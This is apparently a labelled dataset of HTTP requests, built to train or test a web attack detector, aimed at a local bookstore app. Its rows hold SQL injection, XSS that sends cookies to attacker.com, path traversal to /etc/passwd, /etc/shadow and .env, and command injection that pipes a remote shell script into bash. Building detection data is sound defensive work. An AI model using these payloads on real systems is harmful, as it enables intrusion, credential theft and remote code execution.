method,path,query_params,headers,body,client_ip,user_agent,label,attack_type
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""1%27%20ORDER%20BY%201--"", ""password"": ""password""}",192.168.1.152,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",1,SQLI
GET,/static/..%2f..%2f..%2f..%2fsqlite3.db,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,3,PATH
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 44, ""rating"": 5, ""review_text"": ""Sách hay! &#x3C;input type='text' autofocus onfocus=alert(1)&#x3E;""}",198.51.100.77,Nikto/2.1.6,2,XSS
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""\"" onmouseover=\""eval(String.fromCharCode(97,108,101,114,116,40,49,41))\"""", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""\"" onmouseover=\""eval(String.fromCharCode(97,108,101,114,116,40,49,41))\""""}",198.51.100.23,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,XSS
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 15, ""rating"": 5, ""review_text"": ""Sách hay! <script>fetch('http://attacker.com', {body: document.cookie})</script>""}",192.168.1.105,Go-http-client/1.1,2,XSS
GET,/api/v1/vulnerable/reviews/,book_id=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.210,curl/8.4.0,2,XSS
GET,/static/..//..//..//..//..//..//etc/hosts,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.200,sqlmap/1.7.11#stable (https://sqlmap.org),3,PATH
GET,/static/../../../../sqlite3.db%00.pdf,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,curl/8.4.0,3,PATH
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<details/open/ontoggle=alert(1)>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<details/open/ontoggle=alert(1)>""}",10.0.0.88,Nikto/2.1.6,2,XSS
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""\"" onmouseover=\""alert(1)\"""", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""\"" onmouseover=\""alert(1)\""""}",192.168.1.151,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",2,XSS
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<img src=x onerror=alert(1)>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<img src=x onerror=alert(1)>""}",198.51.100.23,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,2,XSS
GET,/api/v1/vulnerable/reviews/,"book_id=<script>fetch('http://attacker.com', {body: document.cookie})</script>","{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.210,Nikto/2.1.6,2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1;$IFS$(id)""}",192.168.1.210,Go-http-client/1.1,4,CMD
GET,/books/,category=%2527%2520OR%2520%2527a%2527%2520LIKE%2520%2527a,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,Wget/1.21.3,1,SQLI
GET,/api/v1/vulnerable/books/search/,q=%2527%2520UNION%2520ALL%2520SELECT%2520null%252C%2520email%252C%2520password%252C%2520null%2520FROM%2520auth_user--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,198.51.100.23,sqlmap/1.7.11#stable (https://sqlmap.org),1,SQLI
GET,/api/v1/vulnerable/books/search/,q=' OR '1'='1,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.5.55,sqlmap/1.7.11#stable (https://sqlmap.org),1,SQLI
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; w'h'o'a'm'i""}",198.51.100.77,curl/8.4.0,4,CMD
GET,/api/v1/vulnerable/books/search/,q=admin'/*,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.210,curl/8.4.0,1,SQLI
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""'/**/WAITFOR/**/DELAY/**/'0:0:5'--"", ""password"": ""123456""}",192.168.1.150,python-requests/2.31.0,1,SQLI
GET,/api/v1/vulnerable/files/download/,file=....//....//....//....//sqlite3.db,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,198.51.100.23,sqlmap/1.7.11#stable (https://sqlmap.org),3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; echo d2hvYW1p | base64 -d | sh""}",198.51.100.77,python-requests/2.31.0,4,CMD
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<script src='http://attacker.com/xss.js'></script>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<script src='http://attacker.com/xss.js'></script>""}",192.168.1.105,Go-http-client/1.1,2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1&& curl http://attacker.com/shell.sh | bash""}",198.51.100.77,Nikto/2.1.6,4,CMD
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""'/**/OR/**/''='"", ""password"": """"}",192.168.1.105,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,1,SQLI
GET,/api/v1/vulnerable/reviews/,book_id=<img src=x onerror=alert(1)>,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.151,curl/8.4.0,2,XSS
POST,/rate/34/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 5, ""comment"": ""' onfocus='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'""}",198.51.100.23,Wget/1.21.3,2,XSS
GET,/orders/12/invoice.pdf,template=../../manage.py,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.99,Go-http-client/1.1,3,PATH
GET,/api/v1/vulnerable/files/download/,file=..//..//..//..//..//..//.env,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.150,Go-http-client/1.1,3,PATH
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 12, ""rating"": 5, ""review_text"": ""Sách hay! <ImG src=x OnerRoR=AlErt(1)>""}",172.16.4.12,python-requests/2.31.0,2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1%26%26%20uname%20-a""}",192.168.1.105,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),4,CMD
GET,/static/..//..//..//..//..//..//..//..//sqlite3.db,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.151,sqlmap/1.7.11#stable (https://sqlmap.org),3,PATH
GET,/api/v1/vulnerable/books/search/,q=' OR 5-2=3--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.210,curl/8.4.0,1,SQLI
GET,/orders/3/invoice.pdf,template=%252e%252e%252f%252e%252e%252fdata/waf_security.db,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.99,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",3,PATH
GET,/orders/12/invoice.pdf,template=../../../../etc/passwd%00.pdf,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.99,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),3,PATH
GET,/orders/5/invoice.pdf,template=../../bookstore/settings/base.py,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.151,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,3,PATH
GET,/api/v1/vulnerable/reviews/,"book_id="" onmouseover=""alert(1)""","{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,10.0.0.99,curl/8.4.0,2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1| $(cat /etc/passwd)""}",172.16.4.12,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),4,CMD
GET,/api/v1/vulnerable/files/download/,file=../../etc/shadow%00.pdf,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.210,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),3,PATH
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""admin' #"", ""password"": """"}",10.0.0.99,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",1,SQLI
GET,/orders/8/invoice.pdf,template=..\..\..\..\windows\win.ini,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.105,curl/8.4.0,3,PATH
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 40, ""rating"": 5, ""review_text"": ""Sách hay! <iframe src='javascript:alert(1)'></iframe>""}",192.168.1.151,curl/8.4.0,2,XSS
GET,/api/v1/vulnerable/reviews/,book_id=javascript:confirm(1),"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,203.0.113.45,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",2,XSS
GET,/books/,category=')/**/OR/**/('1'='1,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,198.51.100.77,sqlmap/1.7.11#stable (https://sqlmap.org),1,SQLI
GET,/books/,category=admin' --,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,python-requests/2.31.0,1,SQLI
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; echo d2hvYW1p | base64 -d | sh""}",198.51.100.77,Go-http-client/1.1,4,CMD
GET,/books/,"category=1' UNION SELECT null, tbl_name, null, null FROM sqlite_master--","{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.200,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,1,SQLI
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1&& uname -a""}",10.0.0.88,Wget/1.21.3,4,CMD
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1|${IFS}ps${IFS}aux""}",192.168.1.210,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,4,CMD
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; netstat -an""}",192.168.1.152,Wget/1.21.3,4,CMD
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<Svg/ONloAD=AlERt('PBL6')>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<Svg/ONloAD=AlERt('PBL6')>""}",198.51.100.77,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",2,XSS
GET,/api/v1/vulnerable/books/search/,q=' OR 'x'='x,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.105,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,1,SQLI
GET,/api/v1/vulnerable/reviews/,book_id=<svg/onload=alert('PBL6')>,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.151,sqlmap/1.7.11#stable (https://sqlmap.org),2,XSS
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 23, ""rating"": 5, ""review_text"": ""Sách hay! <SCriPT>fetch('http://attacker.com', {body: document.cookie})</SCriPT>""}",10.0.0.88,Wget/1.21.3,2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1|${IFS}$(cat${IFS}/etc/passwd)""}",198.51.100.23,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,4,CMD
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1%7C%20ps%20aux""}",198.51.100.23,Nikto/2.1.6,4,CMD
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""admin'/*"", ""password"": ""admin123""}",10.0.0.99,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,1,SQLI
GET,/orders/13/invoice.pdf,template=..\..\data\waf_security.db,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.150,Wget/1.21.3,3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1%26%20systeminfo""}",192.168.1.152,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",4,CMD
POST,/rate/48/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 5, ""comment"": ""<img src='invalid' onerror='alert(\""XSS\"")'>""}",192.168.1.150,Nikto/2.1.6,2,XSS
GET,/api/v1/vulnerable/files/download/,file=C:\windows\system32\calc.exe,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,Go-http-client/1.1,3,PATH
